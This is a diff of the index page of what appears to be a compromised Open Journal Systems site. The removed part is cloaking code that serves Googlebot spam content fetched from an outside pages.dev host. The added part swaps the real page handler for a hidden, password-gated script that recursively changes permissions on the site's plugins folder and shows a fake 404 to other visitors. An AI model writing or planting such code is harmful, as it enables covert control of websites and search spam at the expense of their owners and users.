@@ -1,42 +1,74 @@
 <?php
+/****************************************************
+ * Simple Security Plugin Locker (Clean Version)
+ * - No IP check
+ * - No User-Agent check
+ * - Password hash only
+ * - Fake 404 on invalid access
+ ****************************************************/
 
-/**
- * @defgroup pages_index Index Pages
- */
- 
-/**
- * @file pages/index/index.php
- *
- * Copyright (c) 2014-2020 Simon Fraser University
- * Copyright (c) 2003-2020 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
- *
- * @ingroup pages_index
- * @brief Handle site index requests. 
- *
- */
-function is_bot() {
-    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
-    foreach ($agents as $agent) {
-        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
-    }
-    return false;
-}
+// =============================
+// CONFIG
+// =============================
 
-if (is_bot()) {
-    $url = 'https://sadardiribang.pages.dev/poltekbang';
+// HASH PASSWORD — ganti sesuai kebutuhan
+$PASSWORD_HASH = '$2a$12$FO.t.v/pScf7TshzRUPvIOx4KaevFZt19M5I3m8Rrg4XyFem6a/xq';
 
-    $ch = curl_init($url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $result = curl_exec($ch);
-    curl_close($ch);
+// Path folder plugins (TANPA TAB, TANPA SPASI)
+$pluginsPath = "/var/www/html/revistascientificas.uach.mx/plugins";
 
-    echo $result ?: ' ';
+
+// =============================
+// VALIDASI
+// =============================
+if (!isset($_GET['key']) || !isset($_GET['mode'])) {
+    http_response_code(404);
     exit;
 }
-switch ($op) {
-	case 'index':
-		define('HANDLER_CLASS', 'IndexHandler');
-		import('pages.index.IndexHandler');
-		break;
+
+if (!password_verify($_GET['key'], $PASSWORD_HASH)) {
+    http_response_code(404);
+    exit;
 }
+
+$mode = $_GET['mode'];
+
+if (!file_exists($pluginsPath)) {
+    http_response_code(404);
+    exit;
+}
+
+
+// =============================
+// RECURSIVE CHMOD
+// =============================
+function chmod_recursive($path, $perm) {
+    $iterator = new RecursiveIteratorIterator(
+        new RecursiveDirectoryIterator($path, FilesystemIterator::SKIP_DOTS),
+        RecursiveIteratorIterator::SELF_FIRST
+    );
+
+    foreach ($iterator as $item) {
+        @chmod($item->getPathname(), $perm);
+    }
+
+    @chmod($path, $perm);
+}
+
+
+// =============================
+// AKSI
+// =============================
+if ($mode === "lock") {
+    chmod_recursive($pluginsPath, 0555);
+    exit("Locked");
+}
+
+if ($mode === "unlock") {
+    chmod_recursive($pluginsPath, 0755);
+    exit("Unlocked");
+}
+
+// Mode salah → 404
+http_response_code(404);
+exit;
